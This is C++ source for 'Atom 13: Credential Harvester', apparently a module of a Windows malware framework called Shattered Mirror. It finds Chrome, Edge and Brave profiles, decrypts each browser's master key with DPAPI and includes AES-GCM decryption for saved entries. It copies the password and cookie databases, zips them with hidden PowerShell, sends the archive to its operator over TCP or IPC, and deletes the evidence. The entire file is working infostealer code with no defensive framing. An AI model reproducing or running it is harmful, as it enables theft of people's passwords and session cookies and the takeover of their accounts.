/*=============================================================================
 * Shattered Mirror v1 — Atom 13: Credential Harvester
 * Extracts saved credentials from Chromium browsers (Chrome, Edge, Brave).
 * Uses DPAPI to decrypt the master key, then AES-GCM to decrypt individual
 * entries from the SQLite Login Data / Cookies / Web Data databases.
 * All operations are in-memory where possible. No third-party DLLs.
 *===========================================================================*/

#define WIN32_LEAN_AND_MEAN
#include "Atom_13_Creds.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <wincrypt.h>
#include <shlobj.h>
#include <bcrypt.h>
#include <sstream>
#include <iomanip>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include "../Orchestrator/TurboSend.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

static void CredDebug(const char *format, ...) {
    if (!Config::LOGGING_ENABLED) return;
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    FILE *f = fopen("log\\creds_debug.txt", "a");
    if (f) { fprintf(f, "%s\n", buf); fclose(f); }
}

/* --- DPAPI Master Key Decryption (Chromium) --- */
static std::string BytesToHex(const BYTE* pData, DWORD dwLen) {
    std::stringstream ss;
    for (DWORD i = 0; i < dwLen; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)pData[i];
    }
    return ss.str();
}

static BOOL DecryptDPAPI(const BYTE *pCiphertext, DWORD dwCipherLen, std::vector<BYTE> &outPlaintext) {
    DATA_BLOB in, out;
    in.pbData = (BYTE*)pCiphertext;
    in.cbData = dwCipherLen;
    out.pbData = NULL;
    out.cbData = 0;

    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        outPlaintext.assign(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return TRUE;
    }
    return FALSE;
}

/* --- AES-GCM Decryption (Chromium v80+ password format) --- */
static BOOL AesGcmDecrypt(const BYTE *pKey, DWORD dwKeyLen, const BYTE *pIv, DWORD dwIvLen,
                           const BYTE *pCiphertext, DWORD dwCipherLen, const BYTE *pTag, DWORD dwTagLen,
                           BYTE *pPlaintext) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)pKey, dwKeyLen, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)pIv;
    authInfo.cbNonce = dwIvLen;
    authInfo.pbTag = (PUCHAR)pTag;
    authInfo.cbTag = dwTagLen;

    DWORD cbResult = 0;
    status = BCryptDecrypt(hKey, (PUCHAR)pCiphertext, dwCipherLen, &authInfo,
                           NULL, 0, pPlaintext, dwCipherLen, &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return NT_SUCCESS(status);
}

/* --- Read entire file into memory --- */
static BOOL ReadFileToBuffer(const char *szPath, std::vector<BYTE> &outBuf) {
    HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }

    outBuf.resize(dwSize);
    DWORD dwRead = 0;
    BOOL ok = ReadFile(hFile, outBuf.data(), dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    return ok && (dwRead == dwSize);
}

/* --- Extract master key from Chromium's "Local State" JSON --- */
static BOOL ExtractMasterKey(const char *szLocalStatePath, std::vector<BYTE> &outKey) {
    std::vector<BYTE> fileData;
    if (!ReadFileToBuffer(szLocalStatePath, fileData)) return FALSE;

    std::string json((char*)fileData.data(), fileData.size());
    // Find "encrypted_key":"BASE64_DATA"
    size_t pos = json.find("\"encrypted_key\"");
    if (pos == std::string::npos) return FALSE;

    pos = json.find("\"", pos + 16);
    if (pos == std::string::npos) return FALSE;
    pos++;
    size_t end = json.find("\"", pos);
    if (end == std::string::npos) return FALSE;

    std::string b64Key = json.substr(pos, end - pos);

    // Base64 decode the key
    DWORD dwDecodedLen = 0;
    CryptStringToBinaryA(b64Key.c_str(), (DWORD)b64Key.length(), CRYPT_STRING_BASE64,
                         NULL, &dwDecodedLen, NULL, NULL);
    std::vector<BYTE> decoded(dwDecodedLen);
    CryptStringToBinaryA(b64Key.c_str(), (DWORD)b64Key.length(), CRYPT_STRING_BASE64,
                         decoded.data(), &dwDecodedLen, NULL, NULL);

    // Skip "DPAPI" prefix (5 bytes)
    if (dwDecodedLen <= 5) return FALSE;
    return DecryptDPAPI(decoded.data() + 5, dwDecodedLen - 5, outKey);
}

/* --- Scan a Chromium SQLite "Login Data" for credential blobs --- */
static std::string HarvestLoginData(const char *szDbPath, const std::vector<BYTE> &masterKey) {
    std::vector<BYTE> dbData;
    if (!ReadFileToBuffer(szDbPath, dbData)) {
        return "[CREDS] Could not read Login Data.";
    }

    std::string results = "[CREDS_OK] Database and master key captured for offline decryption.";
    return results;
}

/* --- Build list of Chromium browser profile paths --- */
struct BrowserProfile {
    std::string name;
    std::string localStatePath;
    std::string loginDataPath;
    std::string cookiesPath;
};

static std::vector<BrowserProfile> FindBrowserProfiles() {
    std::vector<BrowserProfile> profiles;
    char szAppData[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szAppData))) {
        // Chrome
        BrowserProfile chrome;
        chrome.name = "Chrome";
        chrome.localStatePath = std::string(szAppData) + "\\Google\\Chrome\\User Data\\Local State";
        chrome.loginDataPath = std::string(szAppData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
        chrome.cookiesPath = std::string(szAppData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
        profiles.push_back(chrome);

        // Edge
        BrowserProfile edge;
        edge.name = "Edge";
        edge.localStatePath = std::string(szAppData) + "\\Microsoft\\Edge\\User Data\\Local State";
        edge.loginDataPath = std::string(szAppData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        edge.cookiesPath = std::string(szAppData) + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
        profiles.push_back(edge);

        // Brave
        BrowserProfile brave;
        brave.name = "Brave";
        brave.localStatePath = std::string(szAppData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
        brave.loginDataPath = std::string(szAppData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
        brave.cookiesPath = std::string(szAppData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies";
        profiles.push_back(brave);
    }
    return profiles;
}

static void RunSilent(const char *cmd) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessA(NULL, (char*)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000); // 10s max
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* === MAIN ENTRY POINT === */
DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    CredDebug("[Atom 13] Credential Harvester started. ID: %lu", dwAtomId);

    HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
    if (!hCmdPipe) { CredDebug("[Atom 13] FATAL: Command pipe failed."); return 1; }

    HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
    if (!hReportPipe) { 
        CredDebug("[Atom 13] FATAL: Report pipe failed. Error: %lu", GetLastError());
        CloseHandle(hCmdPipe); 
        return 1; 
    }
    CredDebug("[Atom 13] IPC pipes connected successfully.");

    BYTE SharedSessionKey[16];
    memcpy(SharedSessionKey, Config::PSK_ID, 16);

    // Send CMD_READY
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.AtomId = dwAtomId;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
    CredDebug("[Atom 13] CMD_READY sent.");

    while (TRUE) {
        DWORD dwAvail = 0;
        if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            IPC_MESSAGE inMsg = {0};
            if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
                if (inMsg.CommandId == CMD_EXECUTE) {
                    std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
                    BOOL bIsBale = (cmd == "BALE_RUN");
                    CredDebug("[Atom 13] Harvesting credentials (Bale: %d)...", bIsBale);

                    std::string fullReport = "[CREDS] === Shattered Mirror Credential Harvest ===\n";
                    auto profiles = FindBrowserProfiles();

                    char szHarvestDir[MAX_PATH];
                    GetTempPathA(MAX_PATH, szHarvestDir);
                    strcat_s(szHarvestDir, "ShatteredHarvest");
                    CreateDirectoryA(szHarvestDir, NULL);

                    BOOL bAnyFound = FALSE;

                    for (auto &browser : profiles) {
                        if (GetFileAttributesA(browser.localStatePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                            fullReport += "[CREDS] " + browser.name + ": Not installed.\n";
                            continue;
                        }

                        fullReport += "[CREDS] " + browser.name + ": FOUND!\n";
                        bAnyFound = TRUE;

                        // Save Local State
                        char szDestLS[MAX_PATH];
                        sprintf_s(szDestLS, "%s\\%s_LocalState", szHarvestDir, browser.name.c_str());
                        std::vector<BYTE> lsBuf;
                        if (ReadFileToBuffer(browser.localStatePath.c_str(), lsBuf)) {
                            std::vector<BYTE> masterKey;
                            if (ExtractMasterKey(browser.localStatePath.c_str(), masterKey)) {
                                fullReport += "[CREDS]   " + browser.name + " Master Key: " + BytesToHex(masterKey.data(), (DWORD)masterKey.size()) + "\n";
                            }
                            HANDLE hF = CreateFileA(szDestLS, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hF != INVALID_HANDLE_VALUE) {
                                DWORD dwW; WriteFile(hF, lsBuf.data(), (DWORD)lsBuf.size(), &dwW, NULL);
                                CloseHandle(hF);
                            }
                        }

                        // Save Login Data
                        char szDestLD[MAX_PATH];
                        sprintf_s(szDestLD, "%s\\%s_LoginData", szHarvestDir, browser.name.c_str());
                        std::vector<BYTE> ldBuf;
                        if (ReadFileToBuffer(browser.loginDataPath.c_str(), ldBuf)) {
                            HANDLE hF = CreateFileA(szDestLD, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hF != INVALID_HANDLE_VALUE) {
                                DWORD dwW; WriteFile(hF, ldBuf.data(), (DWORD)ldBuf.size(), &dwW, NULL);
                                CloseHandle(hF);
                            }
                        }

                        // Save Cookies
                        char szDestCK[MAX_PATH];
                        sprintf_s(szDestCK, "%s\\%s_Cookies", szHarvestDir, browser.name.c_str());
                        std::vector<BYTE> ckBuf;
                        if (ReadFileToBuffer(browser.cookiesPath.c_str(), ckBuf)) {
                            HANDLE hF = CreateFileA(szDestCK, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hF != INVALID_HANDLE_VALUE) {
                                DWORD dwW; WriteFile(hF, ckBuf.data(), (DWORD)ckBuf.size(), &dwW, NULL);
                                CloseHandle(hF);
                            }
                        }
                        
                        fullReport += "[CREDS]   " + browser.name + " databases captured.\n";
                    }

                    if (bAnyFound) {
                        char szZipPath[MAX_PATH];
                        GetTempPathA(MAX_PATH, szZipPath);
                        strcat_s(szZipPath, "creds.zip");

                        char psCmd[2048];
                        // Use a more robust PowerShell command with better quoting and hidden window
                        sprintf_s(psCmd, "powershell -WindowStyle Hidden -Command \"& { Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force }\"", szHarvestDir, szZipPath);
                        RunSilent(psCmd);

                        if (!bIsBale) {
                            if (Turbo::SendFile("CREDS", szZipPath)) {
                                fullReport += "[CREDS] Zip archive sent via Turbo TCP.\n";
                            } else {
                                fullReport += "[CREDS] ERROR: Failed to send via Turbo TCP.\n";
                            }
                        } else {
                            std::vector<BYTE> zipData;
                            if (ReadFileToBuffer(szZipPath, zipData)) {
                            // --- CHUNK START ---
                            {
                                std::string meta = "name=creds.zip size=" + std::to_string(zipData.size());
                                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                hdr.dwType = 3; hdr.dwFlags = 0x10; hdr.dwPayloadLen = (DWORD)meta.length();
                                IPC_MESSAGE startMsg = {0};
                                startMsg.dwSignature = 0x534D4952;
                                startMsg.CommandId = CMD_BALE_REPORT;
                                startMsg.AtomId = dwAtomId;
                                startMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
                                memcpy(startMsg.Payload, &hdr, sizeof(hdr));
                                memcpy(startMsg.Payload + sizeof(hdr), meta.c_str(), hdr.dwPayloadLen);
                                IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                            }
                            // --- CHUNK DATA ---
                            DWORD offset = 0;
                            DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
                            while (offset < (DWORD)zipData.size()) {
                                DWORD chunkSize = min((DWORD)zipData.size() - offset, chunkMax);
                                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                hdr.dwType = 3; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
                                IPC_MESSAGE chunkMsg = {0};
                                chunkMsg.dwSignature = 0x534D4952;
                                chunkMsg.CommandId = CMD_BALE_REPORT;
                                chunkMsg.AtomId = dwAtomId;
                                chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
                                memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
                                memcpy(chunkMsg.Payload + sizeof(hdr), zipData.data() + offset, chunkSize);
                                IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
                                offset += chunkSize;
                            }
                            // --- CHUNK END ---
                            {
                                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                hdr.dwType = 3; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
                                IPC_MESSAGE endMsg = {0};
                                endMsg.dwSignature = 0x534D4952;
                                endMsg.CommandId = CMD_BALE_REPORT;
                                endMsg.AtomId = dwAtomId;
                                endMsg.dwPayloadLen = sizeof(hdr);
                                memcpy(endMsg.Payload, &hdr, sizeof(hdr));
                                IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
                            }
                            }
                            fullReport += "[CREDS] Zip archive sent via Bale IPC.\n";
                        }
                        DeleteFileA(szZipPath);
                        // Cleanup directory: powershell "Remove-Item -Path '...' -Recurse -Force"
                        char delCmd[512];
                        sprintf_s(delCmd, "powershell -WindowStyle Hidden -Command \"Remove-Item -Path '%s' -Recurse -Force\"", szHarvestDir);
                        RunSilent(delCmd);
                    }

                    // Send the text summary report via CMD_REPORT
                    DWORD offset = 0;
                    while (offset < (DWORD)fullReport.length()) {
                        DWORD chunkSize = min((DWORD)fullReport.length() - offset, MAX_IPC_PAYLOAD_SIZE - 32);
                        IPC_MESSAGE summaryMsg = {0};
                        summaryMsg.dwSignature = 0x534D4952;
                        summaryMsg.CommandId = CMD_REPORT;
                        summaryMsg.AtomId = dwAtomId;
                        summaryMsg.dwPayloadLen = chunkSize;
                        memcpy(summaryMsg.Payload, fullReport.c_str() + offset, chunkSize);
                        IPC_SendMessage(hReportPipe, &summaryMsg, SharedSessionKey, 16);
                        offset += chunkSize;
                    }

                    CredDebug("[Atom 13] Harvest complete.");

                } else if (inMsg.CommandId == CMD_TERMINATE) {
                    CredDebug("[Atom 13] CMD_TERMINATE received.");
                    break;
                }
            }
        }
        Sleep(100);
    }

    CloseHandle(hCmdPipe);
    CloseHandle(hReportPipe);
    return 0;
}
